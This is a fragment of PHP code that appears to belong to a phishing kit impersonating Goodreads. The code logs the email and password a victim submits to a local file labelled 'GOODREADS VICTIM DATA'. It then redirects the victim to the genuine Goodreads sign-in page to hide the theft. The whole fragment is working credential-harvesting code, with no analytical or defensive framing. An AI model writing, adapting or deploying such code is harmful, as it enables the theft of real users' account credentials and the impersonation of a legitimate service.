...
file_put_contents($file, print_r("\nGOODREADS VICTIM DATA => Informations \n", true), FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
...
file_put_contents($file, "Username: " . $_POST['user_email'] ."\n", FILE_APPEND);
file_put_contents($file, "Password: " . $_POST['user_password'] ."\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>

 <meta http-equiv="refresh" content="0; url=https://www.goodreads.com/user/sign_in"/> 
